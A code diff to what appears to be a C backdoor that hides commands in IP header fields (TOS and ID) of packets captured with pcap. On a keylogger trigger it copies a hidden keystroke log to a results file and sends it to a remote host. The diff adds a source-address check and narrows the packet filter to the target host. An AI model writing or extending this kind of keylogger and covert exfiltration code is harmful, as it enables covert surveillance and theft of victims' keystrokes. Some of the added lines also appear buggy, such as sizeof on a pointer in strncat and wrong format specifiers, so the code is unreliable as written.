@@ -201,13 +201,20 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
             default:
                 printf("DEBUG: Packet tossed wrong key\n");
                 break;*/
+            printf("tos: %c\n", ip->ip_tos);
+            printf("ipid: %c\n", ip->ip_id);
+            printf("ttl: %c\n", ip->ip_ttl);
             if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND) {
             } else if(CheckKey(ip->ip_tos, ip->ip_id) == KEYLOGGER){
-                printf("KEYLOGGER\n");
-                //copy keylogger file to results file
-                system("cat .keylogger.txt > .results");
-                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
-        
+                struct in_addr src;
+                src = ip->ip_src;
+                printf("source: %d", ntohs(src.s_addr));
+                if(src.s_addr == inet_addr(Filter->targetip)){
+                    printf("KEYLOGGER\n");
+                    //copy keylogger file to results file
+                    system("cat .keylogger.txt > .results");
+                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
+                }
             } else {
                 printf("DEBUG: Packet tossed wrong key\n");
 
@@ -340,7 +347,7 @@ struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
     return Filter;
 }
 
-void CreateFilter(char *buffer, bool tcp){
+void CreateFilter(char *buffer, bool tcp, char *target){
     memset(buffer, '\0', BUFSIZ);
 
     if(tcp){
@@ -351,6 +358,8 @@ void CreateFilter(char *buffer, bool tcp){
 
     strcat(buffer, "port ");
     strncat(buffer, PORT, sizeof(PORT));
+    strcat(buffer, " and host ");
+    strncat(buffer, target, sizeof(target));
 }
 
 /*
